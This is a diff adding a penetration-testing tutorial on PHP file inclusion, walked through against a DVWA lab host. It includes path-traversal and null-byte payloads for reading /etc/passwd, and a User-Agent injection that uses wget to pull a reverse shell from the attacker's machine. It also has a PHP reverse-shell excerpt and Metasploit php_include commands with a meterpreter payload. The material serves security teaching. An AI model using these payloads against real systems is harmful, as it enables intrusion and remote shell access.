@@ -2,5 +2,138 @@
 Remote File Inclusions (RFI) are very similar to LFI but affect files on remote servers instead of files on the local web server. 
 Remote files can include malicious code that executes on the server in the context of the user running the web server or on any client devices that visit a compromised webpage.
 
+• RFI Example
+• Null Byte Injection
+• LFI/RFI to Shell
 
 
+-- RFI Example --
+
+For this demonstration we have loaded a text file named exploit.txt on a remote server with the IP address 172.16.1.4 (because the text file is on a remote server we don’t have to work with a current working directory with the ../ value but we can reference it directly)
+
+ifconfig ppp0 | grep 'inet '
+inet 172.16.1.4  netmask 255.255.255.255  destination 1.1.1.1
+
+cat /var/www/html/exploit.txt
+Exploit on 172.16.1.4
+
+The URL with the remote file included will look like this: http://10.11.1.250/dvwa/vulnerabilities/fi/?page=http://172.16.1.4/exploit.txt
+
+To successfully include remote files in PHP there are a few parameters in the php.ini file that must be enabled: http://10.11.1.250/dvwa/phpinfo.php
+The php information page the loaded php.ini file on the DVWA machine is located in the following directory: /etc/php5/cgi/php.ini
+
+• allow_url_fopen = On
+• allow_url_include = On
+
+Let’s see if we can include remote files now after restarting the Apache web server: /etc/init.d/apache2 restart
+
+
+-- Null Byte Injection --
+
+A Null byte is a byte with the value zero (%00 or 0x00 in hex) and represents a string termination point or delimiter character. 
+Adding a null byte to a payload can alternate intended program logic as it immediately stops the string from further processing any bytes after the null byte. 
+This means that any bytes after the null byte delimiter will be ignored.
+
+$file = $_GET['page'];
+require_once("/var/www/$file.php");
+
+If the variable $file contains a reference to the passwd file, the code would look as follows when executed:
+
+passwd = $_GET['page'];
+require_once("/var/www/../../../etc/passwd.php");
+
+Add a null byte to the passwd file name to terminate the string at the null byte and discard the '.php' extension.
+
+http://website/page=../../../etc/passwd%00
+
+
+-- LFI/RFI to Shell --
+
+⇒ The proc/self/environ method
+
+http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ
+
+As we can see, the web server responds with the contents of proc/self/environ which means that the proc/self/environ file is readable by the web server. On most modern Linux systems this file is not readable for non-root accounts but it might be on outdated systems and systems with misconfigurations.
+
+Unpack the contents of the gz.tar file and rename the ‘php-reverse-shell.php’ file to revshell.txt.
+
+set_time_limit(0);
+$VERSION = "1.0";
+$ip = "REDACTED_IP";     // CHANGE THIS
+$port = REDACTED_PORT;   // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i;';
+$daemon = 0;
+$debug = 0;
+
+chmod 755 /var/www/html/revshell.txt
+
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+
+The next step is to use Burp suite to modify the User-Agent field (the user-agent is the software that is operating on behalf of the user, i.e. the browser). 
+After reloading the page that includes proc/self/environ the request will appear in Burp suite. 
+This is where we have to replace the contents of the User-Agent field with code that downloads the revshell.txt file and stores it as a PHP file on the target system. 
+The code that we inject in the User-Agent field is the payload that is executed by the remote host.
+
+GET /dvwa/vulnerabilities/fi?page=../../../.../proc/self/environ HTTP/1.1
+Host: 10.11.1.250
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: security=low; PHPSESSID=4db8fb91994c7309b694fbf2f61f3ea7
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Replace the User-Agent with the following code that downloads the revshell.txt file from our machine and stores it as shell.php on the target system: <?system('wget http://[IP attack box]/revshell.txt -O shell.php');?>
+
+GET /dvwa/vulnerabilities/fi?page=../../../.../proc/self/environ HTTP/1.1
+Host: 10.11.1.250
+User-Agent: <?system('wget http://[IP attack box]/revshell.txt -O shell.php');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: security=low; PHPSESSID=4db8fb91994c7309b694fbf2f61f3ea7
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Next, press the ‘Forward’ button in Burp suite to forward the modified request to the web server. The target host will download the reverse shell code from our attack box and store it as shell.php.
+The revshell.txt file with the reverse shell code is now renamed to shell.php and stored in the same directory as the vulnerable page (the current working directory)
+
+What can go wrong
+• Make sure that you set the correct IP and port settings in both the reverse shell file and the Netcat listener.
+• Make sure that the revshell.txt file can be downloaded from your attack box. Incorrect permissions on the file may prevent the target host from downloading the file remotely. You can check this by browsing your local web server to see if you can access the revshell.txt file.
+• Invalid file permissions on the file may throw a ‘Permission denied’ error.
+• Make sure that the revshell file is a txt file and not a PHP file when the web server on the attack box supports the execution of PHP files. The wget command (with -O or output option) we used to download the file will store the revshell.txt file as a PHP file, but a PHP file will be executed on your local web server instead of being downloaded by the remote target.
+
+⇒ Metasploit php_include exploit
+
+Metasploit includes an exploit module named ‘php include’ that can be used to exploit a local file inclusion to get a Meterpreter shell on the target host
+
+msfconsole
+use exploit/unix/webapp/php_include
+show options
+
+• PHPURI: The URI to request where the vulnerable parameter is specified as XXpathXX.
+• PATH: The base directory to prepend to the URL.
+• RHOST: Remote host
+• HEADERS: Cookie containing the PHPSESSID and the security value.
+
+However, before we can set all the required parameters we need to capture the cookie containing the PHPSESSID (PHP Session ID) so we can set it as an option. 
+For this purpose we will be using a Firefox plugin named Cookie Manager+ but you can also capture it using other tools such as Burp Suite.
+
+set HEADERS "Cookie:security=low; PHPSESSID=f7c5f19dfdbfca8021190b6d242a94c9"
+set PHPURI /?page=XXpathXX
+set PATH /dvwa/vulnerabilities/fi/
+set RHOST 10.11.1.250
+set LHOST 172.16.1.4
+set payload php/meterpreter/bind_tcp
+
+
+
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+*
